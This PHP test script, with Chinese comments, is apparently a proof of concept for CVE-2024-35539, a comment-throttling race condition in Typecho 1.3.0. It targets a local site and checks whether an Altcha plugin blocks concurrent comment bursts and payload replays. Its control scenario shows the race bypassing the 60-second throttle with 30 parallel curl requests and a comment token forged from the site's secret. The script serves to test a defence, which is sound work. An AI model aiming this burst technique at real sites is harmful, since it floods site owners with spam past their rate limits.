<?php
/**
 * CVE-2024-35539 实证: Typecho 1.3.0 评论节流竞态条件
 *
 * 场景 A: 插件防护开启, 30 个并发评论请求 (无 altcha) → 应全部 403, 零入库
 * 场景 B: 同一个合法解题 payload 并发重放 30 次 → 应恰好 1 次成功 (防重放原子性)
 * 场景 C: 对照组, 临时关闭插件评论防护 → 同样并发 → 演示核心竞态 (多条入库)
 *
 * 用法: php tests/race-poc.php   (需站点运行于 127.0.0.1:8088)
 */

$configFile = dirname(__DIR__) . '/../typecho/config.inc.php';
require $configFile;
require __DIR__ . '/../Altcha/autoload.php';

use AltchaOrg\Altcha\Algorithm\Pbkdf2;
use AltchaOrg\Altcha\Altcha;
use AltchaOrg\Altcha\Challenge;
use AltchaOrg\Altcha\Payload;
use AltchaOrg\Altcha\SolveChallengeOptions;

$db = \Typecho\Db::get();
$baseUrl = 'http://127.0.0.1:8088';
$referer = $baseUrl . '/index.php/archives/1/';

function readOption(string $name): string
{
    global $db;
    $row = $db->fetchRow($db->select()->from('table.options')->where('user = 0 AND name = ?', $name));
    return (string) ($row['value'] ?? '');
}

$pluginCfg = json_decode(readOption('plugin:Altcha'), true) ?: [];
$siteSecret = (string) ($pluginCfg['hmacSecret'] ?? '');
$antiSpam = readOption('secret');
$token = md5($antiSpam . '&' . $referer);

/** 并发发起 $n 个评论请求 (POST body 取自 $bodyFile), 返回状态码数组 */
function burst(int $n, string $bodyFile): array
{
    $out = shell_exec(
        'seq ' . $n . ' | xargs -P ' . $n . ' -I{} curl -s -o /dev/null -w "%{http_code}\\n" '
        . '-X POST -A RacePoC/1.0 -H ' . escapeshellarg('Referer: ' . $GLOBALS['referer'])
        . ' --data-binary @' . escapeshellarg($bodyFile) . ' ' . escapeshellarg($GLOBALS['referer'] . 'comment')
        . ' | sort | uniq -c | awk \'{print $2 "=" $1}\''
    ) ?: '';
    return array_filter(explode("\n", trim($out)));
}

function commentCount(): int
{
    global $db;
    return (int) $db->fetchObject($db->select(['COUNT(coid)' => 'n'])->from('table.comments'))->n;
}

function setPluginConfig(array $kv): void
{
    global $db;
    $cfg = json_decode(readOption('plugin:Altcha'), true) ?: [];
    foreach ($kv as $k => $v) {
        $cfg[$k] = $v;
    }
    $db->query($db->update('table.options')->rows(['value' => json_encode($cfg)])->where('name = ?', 'plugin:Altcha'));
}

function cleanup(): void
{
    global $db;
    $db->query($db->delete('table.comments')->where('cid = ?', 1));
    $db->query($db->update('table.contents')->rows(['commentsNum' => 0])->where('cid = ?', 1));
}

echo "CVE-2024-35539 竞态实证 (基准评论数: ", commentCount(), ")\n\n";

// ---------- 场景 A: 插件防护下, 无验证并发轰炸 ----------
file_put_contents('/tmp/race-a.txt', http_build_query([
    'author' => 'RaceBot', 'mail' => 'race@poc.test', 'url' => '',
    'text' => 'race no-altcha', '_' => $token,
]));
cleanup();
$codes = burst(30, '/tmp/race-a.txt');
$inserted = commentCount();
echo "场景 A: 30 并发无验证 → 响应 [" . implode(', ', $codes) . "]\n";
echo "        入库评论: {$inserted} 条  => ", 0 === $inserted ? "插件完全拦截 ✓" : "!! 有评论穿透 !!", "\n\n";

// ---------- 场景 B: 同一合法 payload 并发重放 ----------
$challenge = Challenge::fromArray(json_decode(file_get_contents($baseUrl . '/index.php/action/altcha'), true));
$altcha = new Altcha($siteSecret, $siteSecret);
$solution = $altcha->solveChallenge(new SolveChallengeOptions(challenge: $challenge, algorithm: new Pbkdf2(), timeout: 60));
$payload = (new Payload($challenge, $solution))->toBase64();
file_put_contents('/tmp/race-b.txt', http_build_content($payload, $token));
cleanup();
$codes = burst(30, '/tmp/race-b.txt');
$inserted = commentCount();
echo "场景 B: 30 并发重放同一 payload → 响应 [" . implode(', ', $codes) . "]\n";
echo "        入库评论: {$inserted} 条  => ", 1 === $inserted ? "防重放原子性成立, 恰好 1 条 ✓" : "!! 预期 1 条, 实际 {$inserted} 条 !!", "\n\n";

// ---------- 场景 C: 对照, 关闭插件评论防护复现核心竞态 ----------
setPluginConfig(['enableActions' => array_diff((array) ($pluginCfg['enableActions'] ?? []), ['comment'])]);
cleanup();
$codes = burst(30, '/tmp/race-a.txt');
$inserted = commentCount();
echo "场景 C: 对照组 (插件评论防护关闭) → 响应 [" . implode(', ', $codes) . "]\n";
echo "        入库评论: {$inserted} 条 / 30 并发  => ", $inserted > 1
    ? "核心竞态复现: 绕过了 60 秒节流 (CVE-2024-35539) ✓"
    : "未复现 (节流生效或插入被其他因素限制)", "\n\n";

// ---------- 还原 ----------
setPluginConfig(['enableActions' => $pluginCfg['enableActions'] ?? ['comment', 'login']]);
cleanup();
echo "已还原插件配置并清理测试评论\n";

function http_build_content(string $payload, string $token): string
{
    return http_build_query([
        'author' => 'RaceBot', 'mail' => 'race@poc.test', 'url' => '',
        'text' => 'race replay', '_' => $token, 'altcha' => $payload,
    ]);
}
